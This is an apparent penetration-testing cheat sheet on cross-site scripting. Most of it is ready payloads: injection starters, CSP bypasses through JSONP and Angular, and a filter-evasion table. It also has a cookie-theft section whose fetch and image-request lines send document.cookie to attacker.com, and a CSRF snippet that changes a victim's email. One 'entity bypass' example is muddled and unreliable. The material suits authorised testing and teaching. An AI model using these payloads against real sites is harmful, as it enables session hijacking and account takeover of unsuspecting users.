---
title: Cross-Site Scripting (XSS)
excerpt: Reflected, stored and DOM-based XSS — payloads, bypasses, and CSP evasion.
---

# Cross-Site Scripting (XSS)

## Types

| Type | Sink | Persistence |
|---|---|---|
| Reflected | Server response | None |
| Stored | Database / file | Permanent |
| DOM-based | Client-side JS | None |

---

## Payload starters

```html
<!-- Basic alert -->
<script>alert(1)</script>

<!-- Event handler (when tags are filtered) -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onresize=alert(1)>

<!-- String context -->
';alert(1)//
"-alert(1)-"

<!-- Template literal -->
${alert(1)}

<!-- HTML entity bypass -->
&lt;script&gt;alert(1)&lt;/script&gt;  ← won't work
<script>alert(1)</script>             ← actual bypass if entity decoding happens before sink
```

---

## CSP bypass techniques

```
default-src 'self'
```

- `script-src 'unsafe-inline'` — inline scripts allowed
- `script-src 'nonce-xxx'` — if nonce is reused or predictable
- `script-src cdn.example.com` — find JSONP/Angular on whitelisted domains
- `script-src 'strict-dynamic'` — inject trusted script that loads your payload

```html
<!-- JSONP bypass (if jsonp endpoint on allowed domain) -->
<script src="https://allowed.com/jsonp?callback=alert(1)//"></script>

<!-- Angular (if Angular loaded from allowed domain) -->
{{constructor.constructor('alert(1)')()}}
```

---

## DOM sinks to watch

```
document.write()
innerHTML / outerHTML
eval() / setTimeout() / setInterval() with string arg
location.href
element.src / element.action
jQuery: $(), .html(), .after()
```

---

## Steal cookies / session

```javascript
// Via fetch to attacker server
fetch('https://attacker.com/?c=' + document.cookie)

// Via img
new Image().src = 'https://attacker.com/?c=' + encodeURIComponent(document.cookie)

// XSS + CSRF combo: change email
fetch('/api/user', {method:'POST', body:'email=attacker@evil.com', credentials:'include'})
```

---

## Filter bypass cheatsheet

| Block | Bypass |
|---|---|
| `<script>` filtered | `<ScRiPt>`, `<script/src=...>` |
| Quotes filtered | Use `String.fromCharCode` or backticks |
| `alert` filtered | `confirm(1)`, `prompt(1)`, `console.log` |
| Spaces filtered | `<img/src=x/onerror=alert(1)>` |
| `javascript:` filtered | `jAvAsCrIpT:`, `&#106;avascript:` |
